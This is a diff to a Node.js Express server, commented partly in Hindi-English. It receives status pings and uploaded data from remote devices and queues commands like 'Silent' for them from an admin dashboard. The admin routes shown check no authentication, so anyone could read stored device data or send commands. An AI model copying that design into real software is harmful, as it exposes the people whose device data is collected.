@@ -25,30 +25,35 @@ let devicesStatus = {};
 // ==================================================
 
 app.post('/api/status', (req, res) => {
-    const { device_id, model, battery, version, charging } = req.body; 
+    let { device_id, model, battery, version, charging } = req.body; 
     if (!device_id) return res.status(400).json({ error: "No Device ID" });
 
-    // Agar koi pending command hai toh nikal lo
+    // ID hamesha uppercase rakho taaki mismatch na ho
+    device_id = device_id.toUpperCase();
+
+    // Check if there is a pending command
     const pendingCommand = (devicesStatus[device_id] && devicesStatus[device_id].command) ? devicesStatus[device_id].command : "none";
 
-    // Device status update karo
+    // Device status update karo memory mein
     devicesStatus[device_id] = {
         id: device_id,
         model: model || "Unknown Device",
         battery: battery || 0,
         version: version || "--",
-        charging: charging === 'true' || charging === true,
+        charging: (charging === 'true' || charging === true),
         lastSeen: Date.now(),
-        command: "none" // Command nikalte hi reset kar do
+        command: "none" // Command nikalte hi memory se reset
     };
 
-    console.log(`📡 Ping: ${model} | Bat: ${battery}% | Cmd: ${pendingCommand}`);
+    console.log(`📡 Ping: ${model} [${device_id}] | Bat: ${battery}% | Cmd: ${pendingCommand}`);
     res.json({ status: "success", command: pendingCommand });
 });
 
 app.post('/api/upload_data', (req, res) => {
-    const { device_id, type, data } = req.body;
+    let { device_id, type, data } = req.body;
     if (!device_id) return res.status(400).json({ error: "No ID" });
+    
+    device_id = device_id.toUpperCase();
 
     let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
     const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
@@ -90,31 +95,42 @@ app.post('/api/upload_data', (req, res) => {
 // 💻 DASHBOARD SIDE (Admin Side)
 // ==================================================
 
-// --- YE MISSING THA: Specific Device ka status check karne ke liye ---
+// Specific Device Status (Fix: Memory check + Folder scan)
 app.get('/api/device-status/:id', (req, res) => {
-    const device = devicesStatus[req.params.id];
-    if (!device) return res.json({ isOnline: false });
+    const devId = req.params.id.toUpperCase();
+    let device = devicesStatus[devId];
+    
+    // Agar memory mein nahi hai (server restart), toh offline return karo
+    if (!device) {
+        return res.json({ 
+            id: devId,
+            model: "Device Offline",
+            isOnline: false,
+            battery: "--",
+            command: "none"
+        });
+    }
 
-    const isOnline = (Date.now() - device.lastSeen) < 60000; // 60 seconds ping timeout
+    const isOnline = (Date.now() - device.lastSeen) < 60000; 
     res.json({ 
         ...device, 
         isOnline 
     });
 });
 
-// Saare Devices ki list (Dashboard home ke liye)
+// Saare Devices ki list
 app.get('/api/admin/all-devices', (req, res) => {
     const files = fs.readdirSync(UPLOADS_DIR);
     let deviceList = {};
 
     files.forEach(file => {
-        const deviceId = file.split('_')[0];
+        const deviceId = file.split('_')[0].toUpperCase();
         if (!deviceList[deviceId]) {
+            const isOnline = devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false;
             deviceList[deviceId] = {
                 id: deviceId,
-                model: devicesStatus[deviceId]?.model || "Offline Device",
-                lastSeen: devicesStatus[deviceId]?.lastSeen || 0,
-                isOnline: devicesStatus[deviceId] ? (Date.now() - devicesStatus[deviceId].lastSeen < 60000) : false,
+                model: devicesStatus[deviceId]?.model || "Unknown Device",
+                isOnline: isOnline,
                 battery: devicesStatus[deviceId]?.battery || "--"
             };
         }
@@ -122,10 +138,11 @@ app.get('/api/admin/all-devices', (req, res) => {
     res.json(deviceList);
 });
 
-// Data fetch karne ke liye
+// Specific Data Fetch
 app.get('/api/get-data/:device_id/:type', (req, res) => {
-    const { device_id, type } = req.params;
-    const filePath = path.join(UPLOADS_DIR, `${device_id}_${type}.json`);
+    const devId = req.params.device_id.toUpperCase();
+    const type = req.params.type;
+    const filePath = path.join(UPLOADS_DIR, `${devId}_${type}.json`);
 
     if (fs.existsSync(filePath)) {
         res.sendFile(filePath);
@@ -134,16 +151,20 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     }
 });
 
-// Command bhejne ke liye (Silent/Normal etc)
+// Command Bhejna (Silent/Normal etc)
 app.post('/api/send-command', (req, res) => {
-    const { device_id, command } = req.body;
+    let { device_id, command } = req.body;
+    if(!device_id) return res.status(400).json({error: "ID required"});
+    
+    device_id = device_id.toUpperCase();
+
     if (!devicesStatus[device_id]) {
-        devicesStatus[device_id] = { id: device_id, model: "Unknown" };
+        devicesStatus[device_id] = { id: device_id, model: "Connecting..." };
     }
     
     devicesStatus[device_id].command = command;
     console.log(`🚀 Command [${command}] queued for -> ${device_id}`);
-    res.json({ status: "success" });
+    res.json({ status: "success", queuedCommand: command });
 });
 
 app.listen(PORT, () => {
